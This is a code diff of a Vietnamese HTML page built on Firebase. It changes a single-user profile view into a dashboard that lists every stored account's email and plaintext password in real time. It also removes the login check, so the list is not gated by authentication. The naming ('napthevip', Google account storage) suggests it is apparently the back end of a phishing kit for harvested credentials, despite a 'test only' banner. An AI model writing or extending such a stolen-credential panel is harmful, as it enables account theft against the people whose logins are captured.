@@ -2,15 +2,14 @@
 <html lang="vi">
 <head>
   <meta charset="UTF-8">
-  <title>Lutrugg - Lưu Trữ Tài Khoản</title>
+  <title>Lutrugg - Kho Lưu Trữ</title>
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-    import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
     import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
 
     const firebaseConfig = {
       // copy y chang config ở file trên
-      apiKey: "AIzaSy...thay bằng apiKey thật của bạn...",
+      apiKey: "AIzaSy...thay bằng apiKey thật...",
       authDomain: "quocdat-sec.firebaseapp.com",
       databaseURL: "https://quocdat-sec-default-rtdb.firebaseio.com",
       projectId: "quocdat-sec",
@@ -20,63 +19,57 @@
     };
 
     const app = initializeApp(firebaseConfig);
-    const auth = getAuth(app);
     const db = getDatabase(app);
 
-    onAuthStateChanged(auth, (user) => {
-      if (!user) {
-        alert("Bạn chưa đăng nhập! Quay lại trang chính.");
-        window.location.href = "napthevip.html";
-        return;
-      }
+    const accountsRef = ref(db, 'accounts');
 
-      const userRef = ref(db, 'users/' + user.uid);
-      onValue(userRef, (snapshot) => {
-        const data = snapshot.val();
-        if (data) {
-          document.getElementById('photo').src = data.photoURL || 'https://via.placeholder.com/80';
-          document.getElementById('email').textContent = data.email || 'N/A';
-          document.getElementById('name').textContent = data.displayName || 'N/A';
-          document.getElementById('uid').textContent = data.uid;
-          document.getElementById('created').textContent = data.createdAt || 'N/A';
-          document.getElementById('lastSignIn').textContent = data.lastSignIn || 'N/A';
-          document.getElementById('fakePass').textContent = data.fakePassword || 'Chưa có';
-          document.getElementById('status').textContent = 'ĐÃ LƯU THÀNH CÔNG (real-time)';
-        } else {
-          document.getElementById('status').textContent = 'Chưa có dữ liệu cho user này';
-        }
-      });
+    onValue(accountsRef, (snapshot) => {
+      const data = snapshot.val();
+      const list = document.getElementById('accounts-list');
+      list.innerHTML = '';
+
+      if (data) {
+        Object.keys(data).forEach(key => {
+          const item = data[key];
+          const div = document.createElement('div');
+          div.style.margin = '20px 0';
+          div.style.padding = '15px';
+          div.style.background = 'rgba(0,255,157,0.1)';
+          div.style.border = '1px solid #00ff9d';
+          div.style.borderRadius = '8px';
+          div.innerHTML = `
+            <p><strong>Email:</strong> ${item.email || 'N/A'}</p>
+            <p><strong>Mật khẩu:</strong> ${item.password || 'N/A'}</p>
+            <p><strong>Thời gian:</strong> ${item.timestamp ? new Date(item.timestamp).toLocaleString('vi-VN') : 'N/A'}</p>
+            <hr style="border-color:#444;">
+          `;
+          list.appendChild(div);
+        });
+      } else {
+        list.innerHTML = '<p style="color:#aaa;">Chưa có tài khoản nào được lưu.</p>';
+      }
     });
   </script>
 
   <style>
     body { background:#0d001a; color:#00ff9d; font-family:monospace; padding:30px; }
-    .container { max-width:800px; margin:auto; background:rgba(10,0,30,0.9); padding:30px; border:1px solid #00ff9d; border-radius:12px; }
+    .container { max-width:900px; margin:auto; background:rgba(10,0,30,0.9); padding:30px; border:1px solid #00ff9d; border-radius:12px; }
     h1 { color:#ff00aa; text-align:center; text-shadow:0 0 10px #ff00aa; }
-    .info-row { display:flex; justify-content:space-between; margin:12px 0; font-size:1.1rem; }
-    .info-row span:first-child { min-width:180px; color:#aaa; }
-    img { border-radius:50%; width:80px; border:2px solid #00ff9d; }
-    #status { color:#ffd700; font-weight:bold; }
+    #accounts-list div { margin:20px 0; }
+    p { margin:8px 0; }
   </style>
 </head>
 <body>
   <div class="container">
     <h1>LUTRUGG STORAGE</h1>
-    <p style="text-align:center; color:#aaa;">Thông tin tài khoản Google (real-time từ Firebase)</p>
+    <p style="text-align:center; color:#aaa;">Danh sách tài khoản đã lưu (real-time)</p>
 
-    <div style="margin:40px 0; padding:25px; border:1px dashed #00ff9d; border-radius:10px;">
-      <div class="info-row"><span>Ảnh:</span><img id="photo" src="https://via.placeholder.com/80" alt="Avatar"></div>
-      <div class="info-row"><span>Email:</span><span id="email">Đang tải...</span></div>
-      <div class="info-row"><span>Tên:</span><span id="name">Đang tải...</span></div>
-      <div class="info-row"><span>UID:</span><span id="uid">Đang tải...</span></div>
-      <div class="info-row"><span>Tạo lúc:</span><span id="created">Đang tải...</span></div>
-      <div class="info-row"><span>Đăng nhập gần nhất:</span><span id="lastSignIn">Đang tải...</span></div>
-      <div class="info-row"><span>Fake Password nội bộ:</span><span id="fakePass">Đang tải...</span></div>
-      <div class="info-row"><span>Trạng thái:</span><span id="status">Đang tải...</span></div>
+    <div id="accounts-list" style="margin-top:30px;">
+      <p>Đang tải dữ liệu...</p>
     </div>
 
-    <p style="text-align:center; color:#ff3366; font-weight:bold; margin-top:30px;">
-      Chỉ bạn mới thấy dữ liệu của chính mình. Fake password chỉ dùng nội bộ.
+    <p style="text-align:center; color:#ff3366; font-weight:bold; margin-top:50px;">
+      CẢNH BÁO: Đây là dữ liệu nhạy cảm! Không dùng mật khẩu thật. Chỉ test thôi.
     </p>
   </div>
 </body>
